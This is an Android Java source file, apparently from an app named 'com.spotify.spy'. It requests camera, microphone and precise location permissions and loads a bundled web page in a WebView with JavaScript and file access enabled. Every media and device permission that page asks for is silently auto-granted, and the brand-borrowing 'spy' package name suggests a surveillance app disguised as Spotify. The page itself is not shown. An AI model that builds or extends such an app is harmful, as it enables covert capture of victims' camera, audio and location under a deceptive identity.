package com.spotify.spy;

import android.app.Activity;
import android.os.Bundle;
import android.os.Build;
import android.webkit.WebView;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.webkit.PermissionRequest;
import android.Manifest;
import android.content.pm.PackageManager;
import android.view.View;
import android.view.WindowManager;

public class MainActivity extends Activity {

    private static final int PERMISSION_REQUEST_CODE = 100;
    private WebView webView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        try {
            // Fullscreen
            getWindow().setFlags(
                WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN
            );
            
            setContentView(R.layout.activity_main);
            
            // Request permissions
            requestPermissions();
            
            // Setup WebView dengan delay
            new android.os.Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    setupWebView();
                }
            }, 500);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void requestPermissions() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                String[] permissions = {
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.INTERNET
                };
                requestPermissions(permissions, PERMISSION_REQUEST_CODE);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void setupWebView() {
        try {
            webView = findViewById(R.id.webView);
            if (webView == null) return;
            
            WebSettings settings = webView.getSettings();
            settings.setJavaScriptEnabled(true);
            settings.setDomStorageEnabled(true);
            settings.setAllowFileAccess(true);
            settings.setAllowContentAccess(true);
            settings.setMediaPlaybackRequiresUserGesture(false);
            settings.setDatabaseEnabled(true);
            settings.setCacheMode(WebSettings.LOAD_DEFAULT);
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                settings.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
            }

            webView.setWebViewClient(new WebViewClient() {
                @Override
                public boolean shouldOverrideUrlLoading(WebView view, String url) {
                    return false;
                }
            });

            webView.setWebChromeClient(new WebChromeClient() {
                @Override
                public void onPermissionRequest(final PermissionRequest request) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                if (request != null) {
                                    request.grant(request.getResources());
                                }
                            }
                        });
                    }
                }
            });

            webView.loadUrl("file:///android_asset/index.html");
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }

    @Override
    public void onBackPressed() {
        try {
            if (webView != null && webView.canGoBack()) {
                webView.goBack();
            } else {
                super.onBackPressed();
            }
        } catch (Exception e) {
            super.onBackPressed();
        }
    }

    @Override
    protected void onDestroy() {
        try {
            if (webView != null) {
                webView.destroy();
            }
        } catch (Exception e) {
            // Ignore
        }
        super.onDestroy();
    }
}
